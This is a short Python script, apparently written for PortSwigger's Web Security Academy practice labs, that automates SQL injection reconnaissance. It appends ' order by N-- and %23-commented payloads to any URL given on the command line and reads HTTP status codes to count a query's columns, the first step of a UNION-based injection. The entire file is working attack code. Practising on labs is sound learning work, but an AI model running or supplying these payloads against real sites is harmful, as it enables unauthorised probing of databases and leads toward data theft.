#https://portswigger.net/web-security/all-labs

from sys import argv        # To pass argument into script 
import requests 





def FindColumsNumber(TargetUrl):
	# Check if -- comment method works or # method
	respond = requests.get(TargetUrl+"' order by 1--")
	if respond.status_code == 200 :
		for i in range(1,50):
			respond = requests.get(TargetUrl+"' order by %s --"%i)
			if respond.status_code != 200:
				return i - 1
		return False
	else:
		for i in range(1,50):
			respond = requests.get(TargetUrl+"' order by {0} %23".format(i))
			if respond.status_code != 200:
				return i - 1
		return False




if __name__ == "__main__" :
	try:
		TargetUrl = argv[1]
		NumOfColums = FindColumsNumber(TargetUrl)
		print(NumOfColums)
	except:
		print("[url]")